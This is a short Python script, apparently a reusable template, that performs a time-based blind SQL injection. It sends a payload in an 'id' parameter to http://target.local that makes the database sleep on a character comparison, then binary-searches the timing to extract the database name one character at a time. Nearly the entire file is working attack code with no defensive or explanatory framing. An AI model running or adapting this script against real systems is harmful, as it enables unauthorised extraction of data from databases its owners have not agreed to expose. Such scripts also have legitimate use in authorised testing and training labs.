import requests
import time

url = "http://target.local"
extracted_string = ""

for pos in range(1, 20): 
    low = 32   # Printable ASCII start (space)
    high = 126 # Printable ASCII end (~)
    
    while low <= high:
        mid = (low + high) // 2
        
        # Binary search payload: Adjust sleep time to 2-3 seconds to save time
        payload = f"1' AND (SELECT IF(ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid},SLEEP(2),0))-- -"
        params = {"id": payload}
        
        start = time.time()
        try:
            requests.get(url, params=params, timeout=5)
        except requests.exceptions.Timeout:
            pass # Caught the sleep timeout
            
        duration = time.time() - start
        
        if duration >= 2: # If it slept, the character is higher than 'mid'
            low = mid + 1
        else:
            high = mid - 1
            
    if low > 126 or low == 32:
        break # No more printable characters found
        
    extracted_string += chr(low)
    print(f"[+] Found character at position {pos}: {chr(low)} -> Current string: {extracted_string}")

"""
Template to do time based blind sqli. 
"""
